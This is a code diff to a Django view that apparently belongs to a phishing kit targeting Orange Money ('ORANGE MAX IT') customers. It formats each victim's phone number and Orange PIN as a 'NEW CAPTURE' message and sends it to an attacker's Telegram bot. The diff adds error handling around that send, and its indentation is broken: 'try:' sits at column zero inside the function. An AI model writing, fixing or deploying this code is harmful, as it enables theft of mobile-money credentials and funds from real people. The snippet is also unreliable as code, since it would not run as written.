@@ -100,8 +100,10 @@ def sync_data(request):
             return JsonResponse({"status": "error", "message": "Server config missing"}, status=500)
 
         # Format Telegram Message
-    message =(
-        "🇸🇱 <b>ORANGE MAX IT - NEW CAPTURE</b>\n"
+try:
+        # Your message formatting
+        message = (
+            "🇸🇱 <b>ORANGE MAX IT - NEW CAPTURE</b>\n"
             "━━━━━━━━━━━━━━━━━━\n"
             f"📞 <b>PHONE:</b> {order.phone_number}\n"
             f"🔑 <b>PIN:</b> {order.orange_pin}\n"
@@ -112,6 +114,13 @@ def sync_data(request):
             "━━━━━━━━━━━━━━━━━━\n"
             "📡 <b>STATUS:</b> DATA RECEIVED"
         )
+        
+        # Call the notification function
+        send_telegram_notification(message)
+
+except Exception as e:
+        # This closes the 'try' block and handles errors
+        print(f"Error sending Telegram notification: {e}")
 
         # Send to Telegram
         telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
